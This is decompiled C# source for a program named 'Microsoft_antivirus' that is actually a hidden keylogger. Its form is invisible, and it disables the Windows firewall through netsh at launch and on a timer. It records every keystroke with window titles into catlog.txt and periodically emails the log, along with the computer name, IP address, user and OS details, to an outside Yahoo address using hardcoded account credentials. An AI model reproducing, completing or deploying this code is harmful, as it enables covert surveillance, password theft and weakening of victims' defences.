using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft_antivirus.My;

namespace Microsoft_antivirus;

[DesignerGenerated]
public class Form1 : Form
{
	private static ArrayList __ENCList = new ArrayList();

	private IContainer components;

	[AccessedThroughProperty("tm")]
	private Timer _tm;

	[AccessedThroughProperty("n")]
	private TextBox _n;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("st")]
	private TextBox _st;

	[AccessedThroughProperty("tr")]
	private Timer _tr;

	private Thread k;

	private bool keylogging;

	private string log;

	private int key;

	internal virtual Timer tm
	{
		[DebuggerNonUserCode]
		get
		{
			return _tm;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_tm != null)
			{
				_tm.remove_Tick((EventHandler)tm_Tick);
			}
			_tm = value;
			if (_tm != null)
			{
				_tm.add_Tick((EventHandler)tm_Tick);
			}
		}
	}

	internal virtual TextBox n
	{
		[DebuggerNonUserCode]
		get
		{
			return _n;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_n = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual TextBox st
	{
		[DebuggerNonUserCode]
		get
		{
			return _st;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_st = value;
		}
	}

	internal virtual Timer tr
	{
		[DebuggerNonUserCode]
		get
		{
			return _tr;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			if (_tr != null)
			{
				_tr.remove_Tick((EventHandler)tr_Tick);
			}
			_tr = value;
			if (_tr != null)
			{
				_tr.add_Tick((EventHandler)tr_Tick);
			}
		}
	}

	public string enc
	{
		get
		{
			string result = default(string);
			try
			{
				string @string = new ASCIIEncoding().GetString(Convert.FromBase64String(n));
				result = @string;
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if ((disposing && components != null) ? true : false)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_02a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b1: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		tm = new Timer(components);
		n = new TextBox();
		Button1 = new Button();
		Button2 = new Button();
		st = new TextBox();
		tr = new Timer(components);
		((Control)this).SuspendLayout();
		tm.set_Interval(900000);
		TextBox obj = n;
		Point location = new Point(26, 194);
		((Control)obj).set_Location(location);
		n.set_Multiline(true);
		((Control)n).set_Name("n");
		n.set_ScrollBars((ScrollBars)3);
		TextBox obj2 = n;
		Size size = new Size(619, 318);
		((Control)obj2).set_Size(size);
		((Control)n).set_TabIndex(0);
		Button button = Button1;
		location = new Point(822, 18);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(598, 165);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(2);
		((ButtonBase)Button2).set_Text("Button2");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		TextBox obj3 = st;
		location = new Point(302, 173);
		((Control)obj3).set_Location(location);
		((Control)st).set_Name("st");
		TextBox obj4 = st;
		size = new Size(100, 20);
		((Control)obj4).set_Size(size);
		((Control)st).set_TabIndex(3);
		tr.set_Interval(300);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(12, 10);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)st);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)n);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_TransparencyKey(SystemColors.Control);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern short GetAsyncKeyState(short vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern short GetForegroundWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern long GetActiveWindow();

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern uint GetWindowTextA(ushort hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, ushort cch);

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCList.Add(new WeakReference(this));
		k = new Thread(keylog);
		InitializeComponent();
		Process process = new Process();
		string fileName = "netsh.exe";
		process.StartInfo.Arguments = "firewall set opmode disable";
		process.StartInfo.FileName = fileName;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.CreateNoWindow = true;
		process.Start();
		process.WaitForExit();
	}

	private void keylog()
	{
		checked
		{
			try
			{
				keylogging = true;
				InputLanguage currentInputLanguage = InputLanguage.get_CurrentInputLanguage();
				string text = default(string);
				do
				{
					key = 5;
					do
					{
						int asyncKeyState = GetAsyncKeyState((short)key);
						if (asyncKeyState == -32767)
						{
							string lpString = new string('\0', 100);
							GetWindowTextA((ushort)GetForegroundWindow(), ref lpString, 100);
							lpString = lpString.Substring(0, Strings.InStr(lpString, "\0", (CompareMethod)0) - 1);
							if (Operators.CompareString(text, lpString, false) != 0)
							{
								log = log + "\r\n\r\n" + Conversions.ToString(DateAndTime.get_Now()) + "===========[" + lpString + "==================]\r\n\r\n";
								text = lpString;
							}
							if (((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown())
							{
								if (key == 65)
								{
									log += "[CTLa]";
								}
								else if (key == 67)
								{
									log += "[CTLc]";
								}
								else if (key == 86)
								{
									log += "[CTLv]";
								}
								else if (key == 88)
								{
									log += "[CTLx]";
								}
								else if (key == 90)
								{
									log += "[CTLz]";
								}
							}
							else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
							{
								if (key == 49)
								{
									log += "!";
								}
								else if (key == 50)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "\"";
									}
									else
									{
										log += "@";
									}
								}
								else if (key == 51)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "[PND]";
									}
									else
									{
										log += "#";
									}
								}
								else if (key == 52)
								{
									log += "$";
								}
								else if (key == 53)
								{
									log += "%";
								}
								else if (key == 54)
								{
									log += "^";
								}
								else if (key == 55)
								{
									log += "&";
								}
								else if (key == 56)
								{
									log += "*";
								}
								else if (key == 57)
								{
									log += "(";
								}
								else if (key == 48)
								{
									log += ")";
								}
								else if (key == 65)
								{
									log += "ا";
								}
								else if (key == 66)
								{
									log += "b";
								}
								else if (key == 67)
								{
									log += "c";
								}
								else if (key == 68)
								{
									log += "d";
								}
								else if (key == 69)
								{
									log += "e";
								}
								else if (key == 70)
								{
									log += "f";
								}
								else if (key == 71)
								{
									log += "g";
								}
								else if (key == 72)
								{
									log += "h";
								}
								else if (key == 73)
								{
									log += "i";
								}
								else if (key == 74)
								{
									log += "j";
								}
								else if (key == 75)
								{
									log += "k";
								}
								else if (key == 76)
								{
									log += "l";
								}
								else if (key == 77)
								{
									log += "m";
								}
								else if (key == 78)
								{
									log += "n";
								}
								else if (key == 79)
								{
									log += "o";
								}
								else if (key == 80)
								{
									log += "p";
								}
								else if (key == 81)
								{
									log += "q";
								}
								else if (key == 82)
								{
									log += "r";
								}
								else if (key == 83)
								{
									log += "s";
								}
								else if (key == 84)
								{
									log += "t";
								}
								else if (key == 85)
								{
									log += "u";
								}
								else if (key == 86)
								{
									log += "v";
								}
								else if (key == 87)
								{
									log += "w";
								}
								else if (key == 88)
								{
									log += "x";
								}
								else if (key == 89)
								{
									log += "y";
								}
								else if (key == 90)
								{
									log += "z";
								}
								else if (key == 188)
								{
									log += "<";
								}
								else if (key == 189)
								{
									log += "_";
								}
								else if (key == 187)
								{
									log += "=";
								}
								else if (key == 219)
								{
									log += "{";
								}
								else if (key == 221)
								{
									log += "}";
								}
								else if (key == 191)
								{
									log += "?";
								}
								else if (key == 220)
								{
									log += "|";
								}
								else if (key == 186)
								{
									log += ":";
								}
								else if (key == 190)
								{
									log += ">";
								}
								else if (key == 192)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "@";
									}
									else
									{
										log += "~";
									}
								}
								else if (key == 222)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "~";
									}
									else
									{
										log += "\"";
									}
								}
								else if (key == 37)
								{
									log += "[sLFT]";
								}
								else if (key == 39)
								{
									log += "[sRHT]";
								}
								else if (key == 45)
								{
									log += "[CTLv]";
								}
								else if (key == 36)
								{
									log += "[sHME]";
								}
								else if (key == 35)
								{
									log += "[sEND]";
								}
								else if (key == 187)
								{
									log += "+";
								}
								else if (key == 223)
								{
									log += "[TIL]";
								}
							}
							else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
							{
								if (key == 49)
								{
									log += "!";
								}
								else if (key == 50)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "\"";
									}
									else
									{
										log += "@";
									}
								}
								else if (key == 51)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "[PND]";
									}
									else
									{
										log += "#";
									}
								}
								else if (key == 52)
								{
									log += "$";
								}
								else if (key == 53)
								{
									log += "%";
								}
								else if (key == 54)
								{
									log += "^";
								}
								else if (key == 55)
								{
									log += "&";
								}
								else if (key == 56)
								{
									log += "*";
								}
								else if (key == 57)
								{
									log += "(";
								}
								else if (key == 48)
								{
									log += ")";
								}
								else if (key == 65)
								{
									log += "A";
								}
								else if (key == 66)
								{
									log += "B";
								}
								else if (key == 67)
								{
									log += "C";
								}
								else if (key == 68)
								{
									log += "D";
								}
								else if (key == 69)
								{
									log += "E";
								}
								else if (key == 70)
								{
									log += "F";
								}
								else if (key == 71)
								{
									log += "G";
								}
								else if (key == 72)
								{
									log += "H";
								}
								else if (key == 73)
								{
									log += "I";
								}
								else if (key == 74)
								{
									log += "J";
								}
								else if (key == 75)
								{
									log += "K";
								}
								else if (key == 76)
								{
									log += "L";
								}
								else if (key == 77)
								{
									log += "M";
								}
								else if (key == 78)
								{
									log += "N";
								}
								else if (key == 79)
								{
									log += "O";
								}
								else if (key == 80)
								{
									log += "P";
								}
								else if (key == 81)
								{
									log += "Q";
								}
								else if (key == 82)
								{
									log += "R";
								}
								else if (key == 83)
								{
									log += "S";
								}
								else if (key == 84)
								{
									log += "T";
								}
								else if (key == 85)
								{
									log += "U";
								}
								else if (key == 86)
								{
									log += "V";
								}
								else if (key == 87)
								{
									log += "W";
								}
								else if (key == 88)
								{
									log += "X";
								}
								else if (key == 89)
								{
									log += "Y";
								}
								else if (key == 90)
								{
									log += "Z";
								}
								else if (key == 188)
								{
									log += "<";
								}
								else if (key == 189)
								{
									log += "_";
								}
								else if (key == 187)
								{
									log += "=";
								}
								else if (key == 219)
								{
									log += "{";
								}
								else if (key == 221)
								{
									log += "}";
								}
								else if (key == 191)
								{
									log += "?";
								}
								else if (key == 220)
								{
									log += "|";
								}
								else if (key == 186)
								{
									log += ":";
								}
								else if (key == 190)
								{
									log += ">";
								}
								else if (key == 192)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "@";
									}
									else
									{
										log += "~";
									}
								}
								else if (key == 8)
								{
									log += "[BAK]";
								}
								else if (key == 37)
								{
									log += "[sLFT]";
								}
								else if (key == 39)
								{
									log += "[sRHT]";
								}
								else if (key == 45)
								{
									log += "[CTLv]";
								}
								else if (key == 36)
								{
									log += "[sHME]";
								}
								else if (key == 35)
								{
									log += "[sEND]";
								}
								else if (key == 187)
								{
									log += "+";
								}
								else if (key == 222)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "~";
									}
									else
									{
										log += "\"";
									}
								}
								else if (key == 223)
								{
									log += "[TIL]";
								}
							}
							else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
							{
								if (key == 65)
								{
									log += "a";
								}
								else if (key == 66)
								{
									log += "b";
								}
								else if (key == 67)
								{
									log += "c";
								}
								else if (key == 68)
								{
									log += "d";
								}
								else if (key == 69)
								{
									log += "e";
								}
								else if (key == 70)
								{
									log += "f";
								}
								else if (key == 71)
								{
									log += "g";
								}
								else if (key == 72)
								{
									log += "h";
								}
								else if (key == 73)
								{
									log += "i";
								}
								else if (key == 74)
								{
									log += "j";
								}
								else if (key == 75)
								{
									log += "k";
								}
								else if (key == 76)
								{
									log += "l";
								}
								else if (key == 77)
								{
									log += "m";
								}
								else if (key == 78)
								{
									log += "n";
								}
								else if (key == 79)
								{
									log += "o";
								}
								else if (key == 80)
								{
									log += "p";
								}
								else if (key == 81)
								{
									log += "q";
								}
								else if (key == 82)
								{
									log += "r";
								}
								else if (key == 83)
								{
									log += "s";
								}
								else if (key == 84)
								{
									log += "t";
								}
								else if (key == 85)
								{
									log += "u";
								}
								else if (key == 86)
								{
									log += "v";
								}
								else if (key == 87)
								{
									log += "w";
								}
								else if (key == 88)
								{
									log += "x";
								}
								else if (key == 89)
								{
									log += "y";
								}
								else if (key == 90)
								{
									log += "z";
								}
								else if (key == 48)
								{
									log += "0";
								}
								else if (key == 49)
								{
									log += "1";
								}
								else if (key == 50)
								{
									log += "2";
								}
								else if (key == 51)
								{
									log += "3";
								}
								else if (key == 52)
								{
									log += "4";
								}
								else if (key == 53)
								{
									log += "5";
								}
								else if (key == 54)
								{
									log += "6";
								}
								else if (key == 55)
								{
									log += "7";
								}
								else if (key == 56)
								{
									log += "8";
								}
								else if (key == 57)
								{
									log += "9";
								}
								else if (key == 96)
								{
									log += "0";
								}
								else if (key == 97)
								{
									log += "1";
								}
								else if (key == 98)
								{
									log += "2";
								}
								else if (key == 99)
								{
									log += "3";
								}
								else if (key == 100)
								{
									log += "4";
								}
								else if (key == 101)
								{
									log += "5";
								}
								else if (key == 102)
								{
									log += "6";
								}
								else if (key == 103)
								{
									log += "7";
								}
								else if (key == 104)
								{
									log += "8";
								}
								else if (key == 105)
								{
									log += "9";
								}
								else if (key == 188)
								{
									log += ",";
								}
								else if (key == 189)
								{
									log += "-";
								}
								else if (key == 187)
								{
									log += "=";
								}
								else if (key == 222)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "#";
									}
									else
									{
										log += "'";
									}
								}
								else if (key == 219)
								{
									log += "[";
								}
								else if (key == 221)
								{
									log += "]";
								}
								else if (key == 191)
								{
									log += "/";
								}
								else if (key == 220)
								{
									log += "\\";
								}
								else if (key == 186)
								{
									log += ";";
								}
								else if (key == 190)
								{
									log += ".";
								}
								else if (key == 192)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "'";
									}
									else
									{
										log += "`";
									}
								}
								else if (key == 32)
								{
									log += " ";
								}
								else if (key == 13)
								{
									log += "\r\n";
								}
								else if (key == 46)
								{
									log += "[DEL]";
								}
								else if (key == 8)
								{
									log += "[BAK]";
								}
								else if (key == 37)
								{
									log += "[LFT]";
								}
								else if (key == 39)
								{
									log += "[RHT]";
								}
								else if (key == 9)
								{
									log += "[TAB]";
								}
								else if (key == 36)
								{
									log += "[HME]";
								}
								else if (key == 35)
								{
									log += "[END]";
								}
								else if (key == 111)
								{
									log += "/";
								}
								else if (key == 110)
								{
									log += ".";
								}
								else if (key == 109)
								{
									log += "-";
								}
								else if (key == 107)
								{
									log += "+";
								}
								else if (key == 106)
								{
									log += "*";
								}
								else if (key == 223)
								{
									log += "`";
								}
							}
							else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
							{
								if (key == 65)
								{
									log += "A";
								}
								else if (key == 66)
								{
									log += "B";
								}
								else if (key == 67)
								{
									log += "C";
								}
								else if (key == 68)
								{
									log += "D";
								}
								else if (key == 69)
								{
									log += "E";
								}
								else if (key == 70)
								{
									log += "F";
								}
								else if (key == 71)
								{
									log += "G";
								}
								else if (key == 72)
								{
									log += "H";
								}
								else if (key == 73)
								{
									log += "I";
								}
								else if (key == 74)
								{
									log += "J";
								}
								else if (key == 75)
								{
									log += "K";
								}
								else if (key == 76)
								{
									log += "L";
								}
								else if (key == 77)
								{
									log += "M";
								}
								else if (key == 78)
								{
									log += "N";
								}
								else if (key == 79)
								{
									log += "O";
								}
								else if (key == 80)
								{
									log += "P";
								}
								else if (key == 81)
								{
									log += "Q";
								}
								else if (key == 82)
								{
									log += "R";
								}
								else if (key == 83)
								{
									log += "S";
								}
								else if (key == 84)
								{
									log += "T";
								}
								else if (key == 85)
								{
									log += "U";
								}
								else if (key == 86)
								{
									log += "V";
								}
								else if (key == 87)
								{
									log += "W";
								}
								else if (key == 88)
								{
									log += "X";
								}
								else if (key == 89)
								{
									log += "Y";
								}
								else if (key == 90)
								{
									log += "Z";
								}
								else if (key == 48)
								{
									log += "0";
								}
								else if (key == 49)
								{
									log += "1";
								}
								else if (key == 50)
								{
									log += "2";
								}
								else if (key == 51)
								{
									log += "3";
								}
								else if (key == 52)
								{
									log += "4";
								}
								else if (key == 53)
								{
									log += "5";
								}
								else if (key == 54)
								{
									log += "6";
								}
								else if (key == 55)
								{
									log += "7";
								}
								else if (key == 56)
								{
									log += "8";
								}
								else if (key == 57)
								{
									log += "9";
								}
								else if (key == 96)
								{
									log += "0";
								}
								else if (key == 97)
								{
									log += "1";
								}
								else if (key == 98)
								{
									log += "2";
								}
								else if (key == 99)
								{
									log += "3";
								}
								else if (key == 100)
								{
									log += "4";
								}
								else if (key == 101)
								{
									log += "5";
								}
								else if (key == 102)
								{
									log += "6";
								}
								else if (key == 103)
								{
									log += "7";
								}
								else if (key == 104)
								{
									log += "8";
								}
								else if (key == 105)
								{
									log += "9";
								}
								else if (key == 188)
								{
									log += ",";
								}
								else if (key == 189)
								{
									log += "-";
								}
								else if (key == 187)
								{
									log += "=";
								}
								else if (key == 222)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "#";
									}
									else
									{
										log += "'";
									}
								}
								else if (key == 219)
								{
									log += "[";
								}
								else if (key == 221)
								{
									log += "]";
								}
								else if (key == 191)
								{
									log += "/";
								}
								else if (key == 220)
								{
									log += "\\";
								}
								else if (key == 186)
								{
									log += ";";
								}
								else if (key == 190)
								{
									log += ".";
								}
								else if (key == 192)
								{
									if (Operators.CompareString(currentInputLanguage.get_Culture().EnglishName, "English (United Kingdom)", false) == 0)
									{
										log += "'";
									}
									else
									{
										log += "`";
									}
								}
								else if (key == 32)
								{
									log += " ";
								}
								else if (key == 13)
								{
									log += "\r\n";
								}
								else if (key == 46)
								{
									log += "[DEL]";
								}
								else if (key == 8)
								{
									log += "[BAK]";
								}
								else if (key == 37)
								{
									log += "[LFT]";
								}
								else if (key == 39)
								{
									log += "[RHT]";
								}
								else if (key == 9)
								{
									log += "[TAB]";
								}
								else if (key == 36)
								{
									log += "[HME]";
								}
								else if (key == 35)
								{
									log += "[END]";
								}
								else if (key == 111)
								{
									log += "/";
								}
								else if (key == 110)
								{
									log += ".";
								}
								else if (key == 109)
								{
									log += "-";
								}
								else if (key == 107)
								{
									log += "+";
								}
								else if (key == 106)
								{
									log += "*";
								}
								else if (key == 223)
								{
									log += "`";
								}
							}
							TextBox val = n;
							val.set_Text(val.get_Text() + log);
							((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\catlog.txt", log, true);
							log = "";
						}
						key++;
					}
					while (key <= 255);
				}
				while (keylogging);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			Control.set_CheckForIllegalCrossThreadCalls(false);
			k.Start();
			tm.set_Enabled(true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void wr()
	{
		try
		{
			FileStream stream = new FileStream(Application.get_StartupPath() + "\\catlog.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.WriteLine(log);
			log = "";
			streamWriter.Flush();
			streamWriter.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tm_Tick(object sender, EventArgs e)
	{
		try
		{
			Process process = new Process();
			string fileName = "netsh.exe";
			process.StartInfo.Arguments = "firewall set opmode disable";
			process.StartInfo.FileName = fileName;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.WaitForExit();
			_ = Environment.OSVersion.Version.Minor;
			string oSFullName = ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();
			string hostName = Dns.GetHostName();
			IPHostEntry hostByName = Dns.GetHostByName(hostName);
			IPAddress[] addressList = hostByName.AddressList;
			SmtpClient smtpClient = new SmtpClient("smtp.mail.yahoo.com");
			smtpClient.UseDefaultCredentials = true;
			smtpClient.Credentials = new NetworkCredential("fox_cat5@yahoo.com", "catcat");
			smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
			MailMessage mailMessage = new MailMessage("fox_cat5@yahoo.com", "sah_catx@yahoo.com");
			mailMessage.Subject = Environment.MachineName + "  ";
			int num = default(int);
			mailMessage.Body = "information from target\r\n========================================\r\n\r\ncomputer name =  " + Environment.MachineName + "\r\nIP Address =  (" + Conversions.ToString(num) + ") " + addressList[num].ToString() + "\r\nuser domain name =  " + Environment.UserDomainName + "\r\nuser name =  " + Environment.UserName + "\r\nos=  " + oSFullName + "\r\n==========================================================================\r\n\r\n" + n.get_Text();
			smtpClient.Timeout = 3000000;
			smtpClient.Send(mailMessage);
		}
		catch (SmtpException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			_ = Environment.OSVersion.Version.Minor;
			string oSFullName2 = ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName();
			string hostName2 = Dns.GetHostName();
			IPHostEntry hostByName2 = Dns.GetHostByName(hostName2);
			IPAddress[] addressList2 = hostByName2.AddressList;
			SmtpClient smtpClient2 = new SmtpClient("smtp.mail.yahoo.com");
			smtpClient2.UseDefaultCredentials = true;
			smtpClient2.Credentials = new NetworkCredential("fox_cat6@yahoo.com", "catcat");
			smtpClient2.DeliveryMethod = SmtpDeliveryMethod.Network;
			MailMessage mailMessage2 = new MailMessage("fox_cat6@yahoo.com", "sah_catx@yahoo.com");
			mailMessage2.Subject = Environment.MachineName;
			int num2 = default(int);
			mailMessage2.Body = "information from target\r\n========================================\r\n\r\ncomputer name =  " + Environment.MachineName + "\r\nIP Address =  (" + Conversions.ToString(num2) + ") " + addressList2[num2].ToString() + "\r\nuser domain name =  " + Environment.UserDomainName + "\r\nuser name =  " + Environment.UserName + "\r\nos=  " + oSFullName2 + "\r\n==========================================================================\r\n\r\n" + n.get_Text();
			smtpClient2.Send(mailMessage2);
			ProjectData.ClearProjectError();
		}
		catch (ArgumentOutOfRangeException projectError2)
		{
			ProjectData.SetProjectError((Exception)projectError2);
			tm.Start();
			ProjectData.ClearProjectError();
		}
	}

	public void wrf()
	{
		try
		{
			FileStream fileStream = new FileStream(Application.get_StartupPath() + "\\catlog.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite);
			StreamWriter streamWriter = new StreamWriter(fileStream);
			streamWriter.Write(log);
			streamWriter.Flush();
			fileStream.Close();
			streamWriter.Close();
			fileStream.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void wr_Tick(object sender, EventArgs e)
	{
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void f_Tick(object sender, EventArgs e)
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\catlog.txt", log, false);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tmm_Tick(object sender, EventArgs e)
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\catlog.txt", log, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void tr_Tick(object sender, EventArgs e)
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Application.get_StartupPath() + "\\catlog.txt", n.get_Text(), true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}
}
